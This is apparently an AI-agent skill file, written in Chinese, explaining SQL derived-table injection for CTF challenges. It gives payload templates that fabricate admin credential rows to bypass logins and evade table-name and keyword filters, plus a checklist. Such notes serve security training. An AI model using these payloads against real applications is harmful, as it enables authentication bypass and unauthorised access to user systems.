---
name: sqli-virtual-table
description: Use when encountering SQL 虚拟表注入 - 子查询临时表、绕过表名限制、构造特定数据
---

# SQL 虚拟表注入

## Info

- **Tags**: sqli, virtual-table, subquery, bypass
- **场景**: 表名被限制、字段被过滤、需要构造伪造数据

---

## 1. 基本原理

虚拟表（Derived Table）是通过子查询在内存中创建的临时表，作为查询的数据源。

```sql
SELECT * FROM (子查询) 别名
```

---

## 2. 利用场景

### 绕过表名限制

当无法直接访问目标表时：

```sql
-- 传统方式被阻
SELECT * FROM users

-- 虚拟表绕过：构造管理员数据
SELECT * FROM (SELECT 'admin' AS username, '123' AS password) t
```

### 构造特定数据

```sql
-- 构造管理员账户数据用于登录绕过
SELECT * FROM (SELECT 'admin' username, 'password' password) tmp
```

### 绕过字段级过滤

```sql
-- 重命名字段绕过检测
SELECT user, pass FROM (SELECT 'admin' user, '123' pass) v
```

---

## 3. CTF 常用格式

### 基础模板

```sql
SELECT 所需字段 FROM
(SELECT '期望值1' 字段1, '期望值2' 字段2) 别名
WHERE 查询条件
```

### 管理员登录场景

```sql
SELECT username, password FROM
(SELECT 'admin' username, '123' password) a
WHERE username = 'admin' AND password = '123'
```

### 简洁变种

```sql
(SELECT'admin'u,'1'p)x
(SELECT'admin'a,'pwd'b)t
```

---

## 4. 技术优势

| 优势 | 说明 |
|------|------|
| 规避关键字检测 | 避免 UNION、JOIN 等敏感操作 |
| 精确数据控制 | 完全控制返回的字段和值 |
| 结构保持完整 | 外层 WHERE、ORDER BY 等正常生效 |
| 不受数据库内容限制 | 不需要实际存在对应表和数据 |

---

## 5. 适用条件

- 表名参数可控
- 查询结构已知
- 字段名已知或可推测
- 数据库支持子查询作为表（MySQL、PostgreSQL、SQLite 等主流数据库均支持）

---

## CTF 检查清单

- [ ] 检查是否存在表名参数可控的注入点
- [ ] 尝试用虚拟表替代实际表名
- [ ] 构造管理员账户数据绕过登录
- [ ] 使用简洁写法减少字符长度
